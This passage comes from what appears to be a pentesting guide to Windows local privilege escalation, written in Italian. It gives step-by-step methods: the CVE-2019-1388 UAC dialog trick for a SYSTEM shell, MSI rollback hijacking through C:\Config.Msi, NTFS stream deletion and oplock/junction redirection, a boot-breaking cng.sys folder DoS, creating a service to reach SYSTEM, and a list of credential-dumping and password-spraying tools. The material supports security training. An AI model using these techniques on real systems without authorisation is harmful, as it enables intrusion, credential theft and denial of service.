Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Per sfruttare questa vulnerabilità, è necessario eseguire i seguenti passaggi:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

La tecnica descritta [**in questo blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) con un exploit code [**disponibile qui**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attacco consiste fondamentalmente nell'abusare della feature di rollback di Windows Installer per sostituire file legittimi con file malevoli durante il processo di uninstall. Per questo l'attaccante deve creare un **malicious MSI installer** che verrà usato per hijackare la cartella `C:\Config.Msi`, che poi sarà usata da Windows Installer per memorizzare i rollback files durante la disinstallazione di altri pacchetti MSI dove i rollback files sarebbero stati modificati per contenere il payload malevolo.

La tecnica riassunta è la seguente:

1. **Fase 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Crea un `.msi` che installa un file innocuo (es., `dummy.txt`) in una cartella scrivibile (`TARGETDIR`).
- Marca l'installer come **"UAC Compliant"**, così un **non-admin user** può eseguirlo.
- Tieni un **handle** aperto al file dopo l'install.

- Step 2: Begin Uninstall
- Disinstalla lo stesso `.msi`.
- Il processo di uninstall inizia a spostare file in `C:\Config.Msi` e rinominarli in file `.rbf` (rollback backups).
- **Poll l'open file handle** usando `GetFinalPathNameByHandle` per rilevare quando il file diventa `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Il `.msi` include una **custom uninstall action (`SyncOnRbfWritten`)** che:
- Segnala quando `.rbf` è stato scritto.
- Poi **attende** su un altro evento prima di continuare l'uninstall.

- Step 4: Block Deletion of `.rbf`
- Quando segnalato, **apri il file `.rbf`** senza `FILE_SHARE_DELETE` — questo **impedisce che venga cancellato**.
- Poi **segnala indietro** così l'uninstall può terminare.
- Windows Installer non riesce a cancellare il `.rbf`, e poiché non può eliminare tutto il contenuto, **`C:\Config.Msi` non viene rimosso**.

- Step 5: Manually Delete `.rbf`
- Tu (attaccante) cancelli manualmente il file `.rbf`.
- Ora **`C:\Config.Msi` è vuota**, pronta per essere hijackata.

> A questo punto, **trigger the SYSTEM-level arbitrary folder delete vulnerability** per cancellare `C:\Config.Msi`.

2. **Fase 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Ricrea tu la cartella `C:\Config.Msi`.
- Imposta **weak DACLs** (es., Everyone:F), e **tieni un handle aperto** con `WRITE_DAC`.

- Step 7: Run Another Install
- Installa di nuovo il `.msi`, con:
- `TARGETDIR`: posizione scrivibile.
- `ERROROUT`: una variabile che forza un failure.
- Questa install sarà usata per triggerare di nuovo il **rollback**, che legge `.rbs` e `.rbf`.

- Step 8: Monitor for `.rbs`
- Usa `ReadDirectoryChangesW` per monitorare `C:\Config.Msi` fino a quando un nuovo `.rbs` appare.
- Cattura il suo filename.

- Step 9: Sync Before Rollback
- Il `.msi` contiene una **custom install action (`SyncBeforeRollback`)** che:
- Segnala un evento quando il `.rbs` è creato.
- Poi **attende** prima di continuare.

- Step 10: Reapply Weak ACL
- Dopo aver ricevuto l'evento `.rbs created`:
- Windows Installer **riapplica ACL forti** a `C:\Config.Msi`.
- Ma poiché hai ancora un handle con `WRITE_DAC`, puoi **riapplicare ACL deboli** di nuovo.

> Le ACL vengono **enforced solo all'apertura dell'handle**, quindi puoi ancora scrivere nella cartella.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Sovrascrivi il file `.rbs` con uno **fake rollback script** che dice a Windows di:
- Ripristinare il tuo `.rbf` (DLL malevola) in una **posizione privilegiata** (es., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Droppa il tuo fake `.rbf` contenente una **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Segnala l'evento di sync così l'installer riprende.
- Una **type 19 custom action (`ErrorOut`)** è configurata per **fallire intenzionalmente l'install** in un punto noto.
- Questo causa l'inizio del **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Legge il tuo malicious `.rbs`.
- Copia il tuo `.rbf` DLL nella target location.
- Ora hai la tua **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Esegui un trusted **auto-elevated binary** (es., `osk.exe`) che carica la DLL che hai hijackato.
- **Boom**: il tuo codice viene eseguito **come SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

La tecnica principale del rollback MSI (quella precedente) presuppone che tu possa cancellare un'intera cartella (es., `C:\Config.Msi`). Ma cosa succede se la tua vulnerabilità permette solo la **cancellazione arbitraria di file**?

Puoi sfruttare gli internals di NTFS: ogni cartella ha un flusso di dati alternativo nascosto chiamato:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Questo stream memorizza i **metadati dell'indice** della cartella.

Quindi, se **elimini lo stream `::$INDEX_ALLOCATION`** di una cartella, NTFS **rimuove l'intera cartella** dal filesystem.

Puoi farlo usando le API standard per l'eliminazione di file, come:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Anche se stai chiamando un'API di cancellazione di *file*, essa **cancella la cartella stessa**.

### Da Folder Contents Delete a SYSTEM EoP
Cosa succede se il tuo primitive non ti permette di cancellare file/cartelle arbitrari, ma **consente la cancellazione dei *contenuti* di una cartella controllata dall'attaccante**?

1. Passo 1: Configura una cartella esca e un file
- Crea: `C:\temp\folder1`
- Al suo interno: `C:\temp\folder1\file1.txt`

2. Passo 2: Posiziona un **oplock** su `file1.txt`
- L'**oplock** **mette in pausa l'esecuzione** quando un processo privilegiato tenta di cancellare `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Passo 3: Avvia il processo SYSTEM (ad es., `SilentCleanup`)
- Questo processo scansiona cartelle (ad es., `%TEMP%`) e cerca di eliminare il loro contenuto.
- Quando raggiunge `file1.txt`, l'**oplock** scatta e consegna il controllo al tuo callback.

4. Passo 4: All'interno del callback dell'oplock – reindirizza la cancellazione

- Opzione A: Sposta `file1.txt` altrove
- Questo svuota `folder1` senza rompere l'oplock.
- Non eliminare `file1.txt` direttamente — questo rilascierebbe l'oplock prematuramente.

- Opzione B: Converti `folder1` in una **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opzione C: Crea un **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Questo prende di mira lo stream interno di NTFS che memorizza i metadati della cartella — cancellarlo cancella la cartella.

5. Passo 5: Rilascia l'oplock
- Il processo SYSTEM continua e tenta di cancellare `file1.txt`.
- Ma ora, a causa della junction + symlink, in realtà sta eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Risultato**: `C:\Config.Msi` viene eliminato da SYSTEM.

### Da Arbitrary Folder Create a Permanent DoS

Sfrutta una primitiva che ti permette di **create an arbitrary folder as SYSTEM/admin** —  anche se **non puoi scrivere file** o **impostare permessi deboli**.

Crea una **cartella** (non un file) con il nome di un **critical Windows driver**, ad es.:
```
C:\Windows\System32\cng.sys
```
- Questo percorso normalmente corrisponde al driver in modalità kernel `cng.sys`.
- Se lo **pre-crei come cartella**, Windows non riesce a caricare il driver reale all'avvio.
- Poi, Windows tenta di caricare `cng.sys` durante l'avvio.
- Vede la cartella, **non riesce a risolvere il driver reale**, e **va in crash o blocca l'avvio**.
- Non c'è **fallback**, e **nessun recupero** senza intervento esterno (es., riparazione dell'avvio o accesso al disco).


## **Da High Integrity a SYSTEM**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, il **percorso verso SYSTEM** può essere semplice semplicemente **creando ed eseguendo un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un service binary assicurati che sia un servizio valido o che il binario esegua le azioni necessarie rapidamente, poiché verrà terminato dopo 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity potresti provare a **abilitare le voci di registro AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se possiedi quei privilegi di token (probabilmente li troverai in un processo già High Integrity), potrai **aprire quasi qualsiasi processo** (non i processi protetti) con il privilegio SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Usando questa tecnica di solito si sceglie **un processo in esecuzione come SYSTEM che possieda tutti i privilegi di token** (_sì, puoi trovare processi SYSTEM senza tutti i privilegi di token_).\
**Puoi trovare un** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica è usata da meterpreter per escalation in `getsystem`. La tecnica consiste nel **creare una pipe e poi creare/abusare di un servizio per scrivere su quella pipe**. Poi, il **server** che ha creato la pipe usando il privilegio **`SeImpersonate`** potrà **impersonare il token** del client della pipe (il servizio) ottenendo privilegi SYSTEM.\
Se vuoi [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **hijackare una dll** caricata da un **processo** in esecuzione come **SYSTEM** sarai in grado di eseguire codice arbitrario con quei permessi. Perciò Dll Hijacking è utile anche per questo tipo di escalation di privilegi e, inoltre, è di gran lunga **più facile da ottenere da un processo High Integrity**, poiché avrà **permessi di scrittura** sulle cartelle usate per caricare le dll.\
**Puoi** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Altri aiuti

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare vettori di Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Controlla misconfigurazioni e file sensibili (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevato.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Controlla alcune possibili misconfigurazioni e raccoglie info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Controlla misconfigurazioni**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae le sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae credenziali da Credential Manager. Rilevato.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spraya le password raccolte attraverso il dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno spoofer ADIDNS/LLMNR/mDNS/NBNS e strumento man-in-the-middle in PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumerazione di base per privesc su Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Cerca note vulnerabilità di privesc (DEPRECATO per Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(Necessita diritti Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca note vulnerabilità di privesc (deve essere compilato con VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera l'host cercando misconfigurazioni (più uno strumento di raccolta info che di privesc) (deve essere compilato) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credenziali da molti software (exe precompilato su github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Controlla misconfigurazioni (eseguibile precompilato su github). Non raccomandato. Non funziona bene su Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Controlla possibili misconfigurazioni (exe da python). Non raccomandato. Non funziona bene su Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato basandosi su questo post (non necessita di accesschk per funzionare correttamente ma può usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e raccomanda exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per vedere la versione di .NET installata sull'host vittima puoi fare:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
